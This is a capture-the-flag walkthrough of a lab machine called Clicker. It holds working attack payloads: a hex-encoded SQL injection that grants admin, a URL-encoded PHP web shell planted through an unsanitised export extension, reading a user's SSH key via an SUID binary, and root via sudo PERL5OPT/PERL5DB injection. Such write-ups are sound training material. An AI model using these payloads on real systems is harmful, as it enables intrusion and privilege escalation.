# Clicker

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.70.56 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-24 23:35 +08
Nmap scan report for 10.129.70.56
Host is up (0.043s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
38863/tcp open  unknown
41469/tcp open  unknown
43433/tcp open  unknown
47485/tcp open  unknown
58185/tcp open  unknown
```

Did a detailed scan too:

```
$ nmap -p 22,80,111,2049,38863,41469,43433,47485,58185 -sC -sV --min-rate 3000 10.129.70.56 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-24 23:35 +08
Nmap scan report for 10.129.70.56
Host is up (0.011s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89d7393458a0eaa1dbc13d14ec5d5a92 (ECDSA)
|_  256 b4da8daf659cbbf071d51350edd81130 (ED25519)
80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Did not follow redirect to http://clicker.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37311/udp   mountd
|   100005  1,2,3      47485/tcp   mountd
|   100005  1,2,3      51863/udp6  mountd
|   100005  1,2,3      53445/tcp6  mountd
|   100021  1,3,4      34639/udp   nlockmgr
|   100021  1,3,4      37758/udp6  nlockmgr
|   100021  1,3,4      43025/tcp6  nlockmgr
|   100021  1,3,4      43433/tcp   nlockmgr
|   100024  1          38863/tcp   status
|   100024  1          46781/tcp6  status
|   100024  1          49246/udp   status
|   100024  1          52153/udp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
38863/tcp open  status   1 (RPC #100024)
41469/tcp open  mountd   1-3 (RPC #100005)
43433/tcp open  nlockmgr 1-4 (RPC #100021)
47485/tcp open  mountd   1-3 (RPC #100005)
58185/tcp open  mountd   1-3 (RPC #100005)
```

Lots of RPC ports, and NFS is open on port 2049. We can also add `clicker.htb` to the `/etc/hosts` file.&#x20;

### NFS --> Source Code

We can first check whether we can mount anything on NFS. A quick `showmount` shows that we can:

```
$ showmount -e clicker.htb
Export list for clicker.htb:
/mnt/backups *
```

There's a backups directory to read, and we can `mount` it.

```
$ sudo mount -t nfs 10.129.70.56:/mnt/backups /mnt/backups -o nolock
$ cd mnt
$ ls
clicker.htb_backup.zip
```

It seems that there's a `zip` file, and we can `cp` this to another directory and then `unzip` it to find some PHP code.

```
$ unzip clicker.htb_backup.zip       
Archive:  clicker.htb_backup.zip
   creating: clicker.htb/
  inflating: clicker.htb/play.php    
  inflating: clicker.htb/profile.php  
  inflating: clicker.htb/authenticate.php  
  inflating: clicker.htb/create_player.php  
  inflating: clicker.htb/logout.php  
 <OMITTED ASSET FILES>
  inflating: clicker.htb/admin.php   
  inflating: clicker.htb/info.php    
  inflating: clicker.htb/diagnostic.php  
  inflating: clicker.htb/save_game.php  
  inflating: clicker.htb/register.php  
  inflating: clicker.htb/index.php   
  inflating: clicker.htb/db_utils.php  
   creating: clicker.htb/exports/
  inflating: clicker.htb/export.php
```

We probably need to do source code review later, but for now we can move on to enumerating the website itself.&#x20;

### Web Enumeration + Source Code Review

The website advertises a game:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

There are some reviews left behind by users in the Info tab:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

We might need these usernames. First, let's register a user and login to see what this game is about. As it turns out, this is just a cookie clicker:

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Based on the source code, there doesn't seem to be a subdomain or hidden directory (yet), so let's take a look at it to find vulnerabilities. `authenticate.php` handles the user sessions:

```php
<?php
session_start();
include_once("db_utils.php");

if (isset($_POST['username']) && isset($_POST['password']) && $_POST['username'] != "" && $_POST['password'] != "") {
	if(check_auth($_POST['username'], $_POST['password'])) {
		$_SESSION["PLAYER"] = $_POST["username"];
		$profile = load_profile($_POST["username"]);
		$_SESSION["NICKNAME"] = $profile["nickname"];
		$_SESSION["ROLE"] = $profile["role"];
		$_SESSION["CLICKS"] = $profile["clicks"];
		$_SESSION["LEVEL"] = $profile["level"];
		header('Location: /index.php');
	}
	else {
		header('Location: /login.php?err=Authentication Failed');
	}
}
?>
```

This assigns a `ROLE` for the user. `admin.php` uses this `ROLE` variable:

```php
<?php
session_start();
include_once("db_utils.php");

if ($_SESSION["ROLE"] != "Admin") {
  header('Location: /index.php');
  die;
}
?>
```

The `export.php` code is another file that contains this 'Admin' check, meaning we probably need to somehow become the administrator of this site, and then abuse a vulnerability within that code later.&#x20;

Within the `diagnostic.php` file, there's another check and its for the `token` this time:

```php
if (isset($_GET["token"])) {
    if (strcmp(md5($_GET["token"]), "ac0e5a6a3a50b5639e69ae6d8cd49f40") != 0) {
        header("HTTP/1.1 401 Unauthorized");
        exit;
	}
}
```

I couldn't crack this hash, so I'll just take note of this for now. The `save_game.php` file contains some interesting stuff:

```php
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
	$args = [];
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
	save_profile($_SESSION['PLAYER'], $_GET);
	// update session info
	$_SESSION['CLICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
	header('Location: /index.php?msg=Game has been saved!');
	
}
?>
```

It seems that it checks the key-value pair for `role`, and prevents it from being modified. The `save_profile` function is from `db_utils.php`:

```php
function save_profile($player, $args) {
	global $pdo;
  	$params = ["player"=>$player];
	$setStr = "";
  	foreach ($args as $key => $value) {
    		$setStr .= $key . "=" . $pdo->quote($value) . ",";
	}
  	$setStr = rtrim($setStr, ",");
  	$stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
  	$stmt -> execute($params);
}
```

### Admin Takeover

Based on the source code above, I'm pretty sure that the `strtolower($key)` check can be bypassed. Also, it looks really intentionally left there. If we can bypass it and add the `Role` parameter, we can update it with `Admin` since it's directly passed directly to `$args[$key] = $value`.&#x20;

The only source I could find was this:

{% embed url="https://security.stackexchange.com/questions/169858/bypass-php-strtoupper-to-perform-sql-injection-on-mysql-database" %}

The above was for SQL Injection, and it shows how putting the characters in hex works. We can test this out using this request:

```http
GET /save_game.php?clicks=32&level=1&%72%6f%6c%65 HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=udc6g87assj3dgqae6842oque3
Upgrade-Insecure-Requests: 1

```

The above request returns a 302 instead of a 500 (which this machine does for errors), indicating that it worked! Now we just need to specify the value of 'Admin' in hex. For some reason, it only accepts "Admin" as a valid parameter. Since this is passed to the SQL database, I added a # character to the end to quote the rest of the query.

```
clicks=321&level=1&%72%6f%6c%65%3d%22%41%64%6d%69%6e%22%23
```

After re-login, we see this:

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

We are now the administrators!

### Export RCE

Here's the rest of the `export.php` code:

```php
$threshold = 1000000;
if (isset($_POST["threshold"]) && is_numeric($_POST["threshold"])) {
    $threshold = $_POST["threshold"];
}
$data = get_top_players($threshold);
$currentplayer = get_current_player($_SESSION["PLAYER"]);
$s = "";
if ($_POST["extension"] == "txt") {
    $s .= "Nickname: ". $currentplayer["nickname"] . " Clicks: " . $currentplayer["clicks"] . " Level: " . $currentplayer["level"] . "\n";
    foreach ($data as $player) {
    $s .= "Nickname: ". $player["nickname"] . " Clicks: " . $player["clicks"] . " Level: " . $player["level"] . "\n";
  }
} elseif ($_POST["extension"] == "json") {
  $s .= json_encode($currentplayer);
  $s .= json_encode($data);
} else {
  $s .= '<table>';
  $s .= '<thead>';
  $s .= '  <tr>';
  $s .= '    <th scope="col">Nickname</th>';
  $s .= '    <th scope="col">Clicks</th>';
  $s .= '    <th scope="col">Level</th>';
  $s .= '  </tr>';
  $s .= '</thead>';
  $s .= '<tbody>';
  $s .= '  <tr>';
  $s .= '    <th scope="row">' . $currentplayer["nickname"] . '</th>';
  $s .= '    <td>' . $currentplayer["clicks"] . '</td>';
  $s .= '    <td>' . $currentplayer["level"] . '</td>';
  $s .= '  </tr>';

  foreach ($data as $player) {
    $s .= '  <tr>';
    $s .= '    <th scope="row">' . $player["nickname"] . '</th>';
    $s .= '    <td>' . $player["clicks"] . '</td>'; 
    $s .= '    <td>' . $player["level"] . '</td>';
    $s .= '  </tr>';
  }
  $s .= '</tbody>';
  $s .= '</table>';
} 

$filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];
file_put_contents($filename, $s);
header('Location: /admin.php?msg=Data has been saved in ' . $filename);
```

There's a lot of things going on here. In short, there are 3 parts to it:

* Accepts one `extension` POST value that is NOT SANITISED (we can indicate PHP!)
* If we don't specify a `.txt` or a `.json`, it will create a HTML file for us and output it somewhere on the machine. Since there is no validation on the parameters being passed in, and we can specify any file extension we want, we could potentially inject PHP code onto the machine to get RCE.

To abuse this, we can easily change our `nickname` to a PHP payload using the same exploit to get admin. The code doesn't check for the `nickname` parameter, so we only need to URL encode our PHP payload.&#x20;

{% code overflow="wrap" %}
```
/save_game.php?clicks=321&level=1&nickname=%22%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%24%5f%52%45%51%55%45%53%54%5b%27%63%6d%64%27%5d%29%3b%20%3f%3e%22%23

decoded, it gives nickname="<?php system($_REQUEST['cmd']); ?>"#
```
{% endcode %}

Afterwards, we can send a POST request with the `extension` parameter.

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

From that `.php` file stored, check for RCE:

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Then, we can get a reverse shell:

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

`jack` is the user present, and cannot grab the user flag yet:

```
www-data@clicker:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Sep  5 19:19 .
drwxr-xr-x 18 root root 4096 Sep  5 19:19 ..
drwxr-x---  7 jack jack 4096 Sep  6 12:30 jack
```

### RE SUID Binary --> Arbitrary Read

I searched for all files on the system owned by this user.

```
www-data@clicker:/opt$ find / -user jack 2> /dev/null
/home/jack
/var/crash/_opt_manage_execute_query.1000.crash
/opt/manage
/opt/manage/README.txt
/opt/manage/execute_query
```

Seems like the `/opt` directory is next. The `README.txt` file contains some interesting information:

```
www-data@clicker:/opt/manage$ cat README.txt 
Web application Management

Use the binary to execute the following task:
        - 1: Creates the database structure and adds user admin
        - 2: Creates fake players (better not tell anyone)
        - 3: Resets the admin password
        - 4: Deletes all users except the admin
```

The `execute_query` file is an ELF binary, and has SUID set for `jack`.&#x20;

{% code overflow="wrap" %}
```
www-data@clicker:/opt/manage$ file execute_query 
execute_query: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cad57695aba64e8b4f4274878882ead34f2b2d57, for GNU/Linux 3.2.0, not stripped
```
{% endcode %}

I transferred it back to my machine for some reverse engineering via `ghidra`. When decompiled, we can see how there are `switch` cases within the `main` function:

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Firstly, I noticed that the `.sql` files DO NOT have absolute paths, meaning we could potentially do PATH hijacking. There's also some usage of the `system` function:

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Interesting. When run on the machine, it just shows this:

```
www-data@clicker:/opt/manage$ ./execute_query 1
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
CREATE TABLE IF NOT EXISTS players(username varchar(255), nickname varchar(255), password varchar(255), role varchar(255), clicks bigint, level int, PRIMARY KEY (username))
--------------

--------------
INSERT INTO players (username, nickname, password, role, clicks, level) 
        VALUES ('admin', 'admin', 'ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82', 'Admin', 999999999999999999, 999999999)
        ON DUPLICATE KEY UPDATE username=username
```

It seems to print the contents of the file it is reading from. If we run `strings` on the binary, we can retrieve the exact command being used:

```
/home/jaH
ck/queriH
/usr/binH
/mysql -H
u clickeH
r_db_useH
r --passH
word='clH
icker_dbH
_passworH
d' clickH
er -v < H
```

The above can be converted to:

{% code overflow="wrap" %}
```
/home/jack/queries
/usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v < 
```
{% endcode %}

The above command was taking input from somewhere, and I assume it's a file. When taking another look at the `switch` statements, I noticed that there was a `default` case, which basically controlled `pcVar3`, the same variable contains filenames from the other `switch` cases.&#x20;

The variable also had limited space since `calloc` is used to allocate memory for it. Since the command is printing verbose output, I tried specifying other files / directories:

```
www-data@clicker:/opt/manage$ ./execute_query 5 ../
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR: Can't initialize batch_readline - may be the input source is a directory or a block device.
```

This worked! I tried reading the `id_rsa` file (since we are in `/home/jack/queries`) and it worked as well:

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Using the above, we can `ssh` in as `jack`:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Sudo Privileges --> Root

I checked `sudo` privileges, and found that `jack` can execute `monitor.sh` as `root`:

```
jack@clicker:~$ sudo -l                                                                                             
Matching Defaults entries for jack on clicker:                                                                      
    env_reset, mail_badpass,                                                                                        
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```

Here's the script contents:

```bash
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```

There's no PATH hijacking for this binary, and the script uses `unset` on some PATH variables, which sets them to nothing basically. When searching for `env` variable exploits for `PERL5LIB` and `PERLLIB`, I found this site:

{% embed url="https://www.elttam.com/blog/env/" %}

Based on the above, setting `PERL5OPT=-d` and `PERL5DB=system("sh");exit;`, we can get a `root` shell. I tried it in the machine, and it worked!

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Now, we can easily get a `root` shell:

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Rooted!
